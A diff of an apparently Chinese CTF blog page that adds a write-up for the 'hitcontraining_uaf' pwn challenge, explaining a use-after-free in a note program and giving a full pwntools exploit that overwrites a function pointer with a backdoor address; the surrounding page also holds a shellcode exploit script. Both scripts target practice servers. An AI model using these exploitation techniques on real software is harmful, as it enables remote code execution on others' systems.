@@ -195,7 +195,7 @@
     <div class="head-info">
       <span class="post-info-item"><i class="iconfont iconcalendar"></i>June 05, 2021</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>622</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>2641</span>
     </div>
   </div>
 </section>
@@ -218,6 +218,26 @@
 <p>这里传递给eax的地址与下面调用时一致，然后vuln函数里面gets输入的地址是ebp+8中存放的地址，其实就是eax里面的地址内容，所以整个程序总的说就是会执行我们输入进去的东西，加上nx未开，输入shellcode来getshell</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28165</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br>p.sendlineafter(<span class="hljs-string">&quot;string!&quot;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
+<h3 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining_uaf"></a>hitcontraining_uaf</h3><p>常规checksec一下</p>
+<p><img   class="lazyload" data-original="/2021/06/05/2021-06-14-buu06/image-20210727132448387.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210727132448387</span></p>
+<p>进入ida看看，其实题目已经有暗示，uaf，所以我们先去delete函数里面看看，</p>
+<p><img   class="lazyload" data-original="/2021/06/05/2021-06-14-buu06/image-20210727132528641.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210727132528641</span></p>
+<p>确实存在着uaf，那么该怎么利用？再看看add函数和printf函数</p>
+<p><img   class="lazyload" data-original="/2021/06/05/2021-06-14-buu06/image-20210727132617843.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210727132617843</span></p>
+<p>这边的add函数比较奇怪，首先是有次数限制只能申请五个堆块，其次是会申请两个堆块，第一个堆块是固定8字节大小，前4个字节存放一个print_note_content函数的地址，后4个字节是我们可以控制的，申请一个任意大小的堆块</p>
+<p><img   class="lazyload" data-original="/2021/06/05/2021-06-14-buu06/image-20210727132832076.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210727132832076</span></p>
+<p>在print函数里面，最后会进行函数调用，就是调用先前在add函数里面保存的print_note_content函数进行打印我们可以控制的堆块里面的内容</p>
+<p><img   class="lazyload" data-original="/2021/06/05/2021-06-14-buu06/image-20210727133015119.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210727133015119</span></p>
+<p>最后就是还存在一个后门函数</p>
+<p>思路：一开始是觉得没有edit这类的函数，可能是要制造堆块重叠，把后门函数劫持到malloc_hook里面去，还以为5个会够，但是一个泄露libc基址，再一个申请fastchunk进行double free，然后还需要申请四次，超过次数了</p>
+<p><img   class="lazyload" data-original="/2021/06/05/2021-06-14-buu06/image-20210727135534549.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210727135534549</span></p>
+<p>这是double free的fastbin上的情况，因为free也是两个，所以直接进行两次操作直接就可以构造出A-B-A</p>
+<p>所以换一种方法：利用那个函数调用，想办法把进行调用的堆块变成是我们可以控制的那个堆块，把内容改成后门函数，那么就可以getshell了！</p>
+<p><img   class="lazyload" data-original="/2021/06/05/2021-06-14-buu06/image-20210727140624461.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210727140624461</span></p>
+<p>像这样，我们可以控制的堆块申请一个比0x8大的堆块，那么我们就不会申请走，而固定申请大小为0x8的堆块就会申请走一个，此时我们，如果再申请0x8的堆块，就会进行更换了，我们申请到的就是之前程序的固定堆块，最后printf一下，就getshell了！</p>
+<p><img   class="lazyload" data-original="/2021/06/05/2021-06-14-buu06/image-20210727141018340.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210727141018340</span></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;i386&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so&quot;</span>)<br><span class="hljs-comment">#p = process(argv=[ld.path,elf.path],env=&#123;&quot;LD_PRELOAD&quot; : libc.path&#125;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26333</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Note size :&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Content :&#x27;</span>,content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printf</span>(<span class="hljs-params">idx</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>shell_addr=<span class="hljs-number">0x8048945</span><br>add(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x8</span>,p32(shell_addr))<br>printf(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
 
       </section>
       <section class="extra">
@@ -236,7 +256,7 @@
 
         
   <nav class="nav">
-    <a href="/2021/06/05/buu06/"><i class="iconfont iconleft"></i>buu06</a>
+    <a href="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E9%9B%86%E5%90%88/"><i class="iconfont iconleft"></i>bin链情况集合</a>
     <a href="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/">不安全的unlink<i class="iconfont iconright"></i></a>
   </nav>
 
@@ -257,7 +277,7 @@
           
   <aside class="toc-wrap">
     <h3 class="toc-title">文章目录：</h3>
-    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#bjdctf-2020-router"><span class="toc-text">bjdctf_2020_router</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#picoctf-2018-shellcode"><span class="toc-text">picoctf_2018_shellcode</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#bjdctf-2020-router"><span class="toc-text">bjdctf_2020_router</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#picoctf-2018-shellcode"><span class="toc-text">picoctf_2018_shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hitcontraining-uaf"><span class="toc-text">hitcontraining_uaf</span></a></li></ol>
   </aside>
 
         
